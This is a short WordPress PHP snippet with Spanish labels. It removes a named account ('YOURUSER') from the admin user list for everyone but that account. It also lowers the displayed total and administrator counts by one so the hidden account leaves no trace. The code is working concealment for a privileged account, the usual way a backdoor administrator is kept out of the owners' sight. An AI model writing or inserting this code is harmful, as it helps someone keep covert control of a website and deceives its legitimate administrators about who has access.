add_action('pre_user_query', 'hide_user');
function hide_user($user_search) {
    global $current_user, $wpdb;

    if ($current_user->user_login !== 'YOURUSER') {
        $user_search->query_where .= $wpdb->prepare(" AND {$wpdb->users}.user_login != %s", 'YOURUSER');
    }
}


// Adds a filter to modify the display of the user count on the user listing screen at /users.php:

add_filter('views_users', 'adjust_user_count');
function adjust_user_count($views) {
    $users = count_users();
    
    $admins_num = isset($users['avail_roles']['administrator']) ? $users['avail_roles']['administrator'] - 1 : 0;
    $all_num = $users['total_users'] - 1;

    $class_all = (strpos($views['all'], 'current') === false) ? '' : 'current';
    $class_adm = (strpos($views['administrator'], 'current') === false) ? '' : 'current';

    $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('Todos') . ' <span class="count">(' . $all_num . ')</span></a>';
    $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrador') . ' <span class="count">(' . $admins_num . ')</span></a>';

    return $views;
}
